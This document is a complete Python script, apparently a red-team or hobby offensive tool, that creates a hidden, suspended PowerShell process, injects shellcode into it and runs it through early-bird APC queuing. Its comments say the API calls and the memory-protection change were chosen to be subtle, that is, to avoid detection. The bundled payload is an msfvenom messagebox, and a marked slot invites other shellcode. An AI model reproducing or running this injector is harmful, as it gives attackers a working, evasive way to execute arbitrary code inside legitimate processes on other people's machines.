## Creates a new Process, Injects and Runs Shellcode
## By ShowNadda
## Version 2.0
## Uses "QueueUserAPC" Instead of "CreateRemoteThread" twice, to be more subtle in API Calls used

# Global Imports
from ctypes import * 
from ctypes import wintypes
import subprocess

# Global Constants & Variables
kernel32 = windll.kernel32
SIZE_T = c_size_t
LPTSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)

# Creating the VirtualAllocEx Definition
VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

# Creating he WriteProcessMemory Definition
WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T,POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

# Creating "_SECURITY_ATTRIBUTES(Structure)" Class
class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nlength', wintypes.DWORD),
                ('lpSecurityDescriptor', wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL),]
SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

# Creating the CreateRemoteThread Definition
CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restypes = wintypes.HANDLE

# Constants to work with Memory
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = ( 0x000f0000 | 0x00100000 | 0x00000FFF)

# Creating the VirtualAllocEx Definition
VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPDWORD)
VirtualProtectEx.restype = wintypes.BOOL

# Creating the Process to inject Shellcode into
process = subprocess.Popen(["powershell.exe"])
#print("Starting Process with PID => {}".format(process.pid))

# Structure for Startup Info
class STARTUPINFO(Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", LPTSTR),
        ("lpDesktop", LPTSTR),
        ("lpTitle", LPTSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", wintypes.LPBYTE),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

# Structure for Process Info
class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

# Creating the CreateProcessA Definition
CreateProcessA = kernel32.CreateProcessA
CreateProcessA.argtypes =(wintypes.LPCSTR, wintypes.LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION))
CreateProcessA.restype = wintypes.BOOL

# Shellcode to Execute
# msfvenom -a x64 -p windows/x64/messagebox TITLE=Hello TEXT=world -f py
# !!! Shellcode goes here !!!
buf =  b""
buf += b"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00"
buf += b"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b"
buf += b"\x52\x60\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e"
buf += b"\x48\x8b\x72\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
buf += b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9"
buf += b"\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e\x48\x8b\x52"
buf += b"\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88\x00"
buf += b"\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b"
buf += b"\x48\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48"
buf += b"\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
buf += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
buf += b"\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd6"
buf += b"\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41\x8b"
buf += b"\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
buf += b"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
buf += b"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0"
buf += b"\x58\x41\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff"
buf += b"\x5d\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe"
buf += b"\x00\x00\x00\x3e\x4c\x8d\x85\x04\x01\x00\x00\x48\x31"
buf += b"\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41"
buf += b"\xba\xf0\xb5\xa2\x56\xff\xd5\x77\x6f\x72\x6c\x64\x00"
buf += b"\x48\x65\x6c\x6c\x6f\x00"


# Function to help with Debugging
def verify(x):
    if not x:
        raise WinError()

# Setting up Variables to create a new Process
startup_info = STARTUPINFO()
startup_info.cb = sizeof(startup_info)
startup_info.dwFlags = 1

# Show Process Window that will be Injected into
startup_info.wShowWindow = 0

# Setting up the PROCESS_INFORMATION
process_info = PROCESS_INFORMATION()
CREATE_NEW_CONSOLE = 0X00000010
CREATE_NO_WINDOW = 0X08000000
CREATE_SUSPENDED = 0x00000004

# Process to be Created
created = CreateProcessA(b"C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe", None, None, None, False, CREATE_SUSPENDED | CREATE_NO_WINDOW, None, None, byref(startup_info), byref(process_info))

# Debugging Process Creation
verify(created)

# Creates the Process info to Display
pid = process_info.dwProcessId
h_process = process_info.hProcess
thread_id = process_info.dwThreadId
h_thread = process_info.hThread

# Displays the Information
print("[!] Started Process! Handle:{}, PID:{}, TID:{}".format(h_process, pid, thread_id))

# Creating new region of memory in the Remote Process, for the Shellcode to Inject into
remote_memory = VirtualAllocEx(h_process, False, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
verify(remote_memory)
print("Memory Allocated to ", hex(remote_memory))

# Writes the Shellcode to Process Memory
write = WriteProcessMemory(h_process, remote_memory, buf, len(buf), None)
verify(write)
print("[!] Success! Bytes written = {}".format(len(buf)))

# Use VirtualProtect to be more subtle, than using  the standard read/write/execute
PAGE_EXECUTE_READ = 0x20
old_protection = wintypes.DWORD(0)
protection = VirtualProtectEx(h_process, remote_memory, len(buf), PAGE_EXECUTE_READ, byref(old_protection))
verify(protection)
print("Protection updated from {} to {}".format(old_protection.value, PAGE_EXECUTE_READ))

# Setup to eventually use "QueueUserAPC"
PAPCFUNC = CFUNCTYPE(None, POINTER(wintypes.ULONG))

# Defining our QueueUserAPC Function
QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes = (PAPCFUNC, wintypes.HANDLE,POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

# Setting up ResumeThread function
ResumeThread = kernel32.ResumeThread
ResumeThread.argtypes = (wintypes.HANDLE, )
ResumeThread.restype = wintypes.BOOL

# Query the Procedure (Start the countdown from the thread sleeping, to now resume)
rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_thread, None)
verify(rqueue)
print("[!] Queueing APC Thread => {}".format(h_thread))

# Resume the Thread
rthread = ResumeThread(h_thread)
verify(rthread)
print("[!] Thread Resumed!!!")
print("[+] Sucess!!! Shellcode has been Executed!")